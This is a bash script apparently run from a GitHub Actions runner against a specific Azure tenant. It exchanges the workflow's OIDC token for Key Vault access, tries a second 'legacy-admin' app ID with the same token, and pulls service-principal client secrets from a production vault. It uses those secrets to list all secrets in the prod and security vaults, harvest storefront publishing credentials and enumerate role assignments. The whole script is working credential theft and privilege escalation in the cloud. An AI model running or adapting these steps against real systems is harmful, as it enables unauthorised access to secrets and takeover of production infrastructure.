#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
CICD_ID=72ff278a-9e71-43ec-bac4-2ca303f8e462

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')

VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$CICD_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" \
  --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "VT_LEN=${#VT}"

# Try LEGACY-ADMIN OIDC token (same OIDC JWT, different client_id)
echo "=== LEGACY-ADMIN OIDC ATTEMPT ==="
LEGACY_APPID=891fb158-f0c4-4b71-b9a7-c32b5c8cd9bb
LT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$LEGACY_APPID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" \
  --data-urlencode "scope=https://management.azure.com/.default")
echo "legacy-arm response: $LT" | head -c 300

# Try to get secrets-sync credentials from KV prod via cicd-deployer
SS_JSON=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/secrets-sync-principal?api-version=7.4" \
  -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
SS_CID=$(echo "$SS_JSON" | python3 -c 'import sys,json;print(json.loads(sys.stdin.read()).get("appId",""))')
SS_SEC=$(echo "$SS_JSON" | python3 -c 'import sys,json;print(json.loads(sys.stdin.read()).get("clientSecret",""))')
echo "SS_CID=$SS_CID SS_SEC_LEN=${#SS_SEC}"

SS_VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$SS_CID" -d "grant_type=client_credentials" \
  --data-urlencode "client_secret=$SS_SEC" \
  --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "SS_VT_LEN=${#SS_VT}"

# LIST all secrets in KV prod via secrets-sync
echo "=== KV PROD SECRETS LIST ==="
curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=50" \
  -H "Authorization: Bearer $SS_VT" | python3 -c '
import sys,json
d=json.load(sys.stdin)
if "value" in d:
    for s in d["value"]:
        print(s["id"])
else:
    print(d)
' 2>&1

# LIST all secrets in KV SEC via secrets-sync
echo "=== KV SEC SECRETS LIST (via secrets-sync) ==="
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=50" \
  -H "Authorization: Bearer $SS_VT"

# Also try KV SEC via cicd-deployer vault token
echo "=== KV SEC SECRETS LIST (via cicd-deployer) ==="
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=50" \
  -H "Authorization: Bearer $VT"

# Try to get storefront publishing creds via reporting-service (maybe it has wider access)
RS_JSON=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" \
  -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
RS_CID=$(echo "$RS_JSON" | python3 -c 'import sys,json;print(json.loads(sys.stdin.read()).get("appId",""))')
RS_SEC=$(echo "$RS_JSON" | python3 -c 'import sys,json;print(json.loads(sys.stdin.read()).get("clientSecret",""))')
RS_ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$RS_CID" -d "grant_type=client_credentials" \
  --data-urlencode "client_secret=$RS_SEC" \
  --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')

echo "=== STOREFRONT PUB CREDS (via reporting-service) ==="
for RG in rg-tbl-storefront-prod-eus rg-tbl-storefront-prod-sea rg-tbl-platform-prod-eus rg-tbl-platform-prod-sea; do
  R=$(curl -sS -X POST \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/publishingcredentials/list?api-version=2023-01-01" \
    -H "Authorization: Bearer $RS_ARM" -H "Content-Length: 0" -o /tmp/sf_resp.txt -w "%{http_code}")
  echo "  $RG: $R"
  if [ "$R" = "200" ]; then
    cat /tmp/sf_resp.txt | python3 -c '
import sys,json
d=json.load(sys.stdin)
p=d["properties"]
print("user:", p.get("publishingUserName",""))
print("pass_len:", len(p.get("publishingPassword","")))
'
    break
  fi
done

# Try role assignments for UAMI (reporting-writer) - what does it have access to?
echo "=== UAMI ROLE ASSIGNMENTS ==="
curl -sS "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'f64d08c7-fde6-4553-99c8-5bf73666ee8c'" \
  -H "Authorization: Bearer $RS_ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for ra in d.get("value",[]):
    scope=ra["properties"]["scope"]
    role=ra["properties"]["roleDefinitionId"].split("/")[-1]
    print(f"  scope={scope}")
    print(f"  role={role}")
' 2>&1

echo "DONE"
